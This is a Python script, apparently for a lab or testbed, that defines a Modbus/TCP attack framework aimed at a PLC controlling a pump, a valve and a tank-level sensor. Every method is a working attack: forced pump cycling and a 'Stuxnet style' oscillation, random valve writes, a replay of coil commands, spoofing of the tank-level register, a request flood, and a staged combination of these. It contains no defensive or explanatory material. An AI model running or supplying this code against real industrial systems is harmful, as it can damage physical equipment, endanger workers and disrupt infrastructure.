import time
import random
from pymodbus.client import ModbusTcpClient

PLC_IP = "192.168.1.20"
PLC_PORT = 502

class ICSAttackFramework:

    def __init__(self):
        self.client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

    def connect(self):
        print("[+] Connecting to PLC")
        self.client.connect()

    def disconnect(self):
        print("[+] Closing connection")
        self.client.close()

    # ------------------------------------------------
    # Read process state
    # ------------------------------------------------

    def read_state(self):

        level = self.client.read_holding_registers(0,1)
        pump = self.client.read_coils(0,1)
        valve = self.client.read_holding_registers(1,1)

        print("LEVEL:", level.registers[0])
        print("PUMP:", pump.bits[0])
        print("VALVE:", valve.registers[0])

    # ------------------------------------------------
    # Command injection
    # ------------------------------------------------

    def command_injection(self):

        print("[ATTACK] Command Injection")

        while True:

            print("Forcing pump ON")
            self.client.write_coil(0, True)

            time.sleep(5)

            print("Forcing pump OFF")
            self.client.write_coil(0, False)

            time.sleep(5)

    # ------------------------------------------------
    # Oscillation attack (Stuxnet style concept)
    # ------------------------------------------------

    def pump_oscillation(self):

        print("[ATTACK] Pump Oscillation")

        while True:

            self.client.write_coil(0, True)
            print("Pump ON")
            time.sleep(2)

            self.client.write_coil(0, False)
            print("Pump OFF")
            time.sleep(2)

    # ------------------------------------------------
    # Valve manipulation
    # ------------------------------------------------

    def valve_attack(self):

        print("[ATTACK] Valve Manipulation")

        while True:

            position = random.randint(0,180)

            print("Setting valve:", position)

            self.client.write_register(1, position)

            time.sleep(3)

    # ------------------------------------------------
    # Replay attack
    # ------------------------------------------------

    def replay_attack(self):

        print("[ATTACK] Replay Attack")

        recorded_commands = [
            (0, True),
            (0, False),
            (0, True),
            (0, False)
        ]

        while True:

            for cmd in recorded_commands:

                coil = cmd[0]
                state = cmd[1]

                print("Replaying command:", coil, state)

                self.client.write_coil(coil, state)

                time.sleep(1)

    # ------------------------------------------------
    # Sensor spoofing
    # ------------------------------------------------

    def sensor_spoof(self):

        print("[ATTACK] Sensor Spoofing")

        while True:

            fake_level = random.randint(0,100)

            print("Spoofing tank level:", fake_level)

            self.client.write_register(0, fake_level)

            time.sleep(2)

    # ------------------------------------------------
    # Flood attack
    # ------------------------------------------------

    def modbus_flood(self):

        print("[ATTACK] Modbus Flood")

        while True:

            for i in range(100):

                self.client.read_holding_registers(0,10)

    # ------------------------------------------------
    # Combined multi-stage attack
    # ------------------------------------------------

    def multi_stage_attack(self):

        print("[ATTACK] Multi Stage ICS Attack")

        # stage 1 reconnaissance

        print("Recon: reading system state")

        for i in range(5):
            self.read_state()
            time.sleep(2)

        # stage 2 manipulation

        print("Stage 2: process manipulation")

        for i in range(20):

            pump_state = random.choice([True,False])

            self.client.write_coil(0,pump_state)

            valve = random.randint(0,180)

            self.client.write_register(1,valve)

            time.sleep(1)

        # stage 3 disruption

        print("Stage 3: command flood")

        for i in range(200):

            self.client.read_holding_registers(0,5)

